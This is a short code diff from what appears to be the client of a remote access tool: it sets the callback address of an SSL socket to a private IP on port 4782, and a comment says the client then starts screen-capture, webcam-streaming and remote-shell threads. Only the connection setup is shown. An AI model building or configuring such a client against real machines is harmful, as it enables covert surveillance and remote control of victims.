@@ -12,7 +12,7 @@ import pyperclip
 # Connect to the server
 def connect_to_server():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect(('server_ip_here', 4782))  # Replace with server's IP
+    client_socket.connect(('10.0.1.33', 4782))  # Replace with server's IP
     secure_socket = ssl.wrap_socket(client_socket, keyfile=None, certfile="client.crt")
     
     # Start threads for screen capture, webcam stream, and remote shell
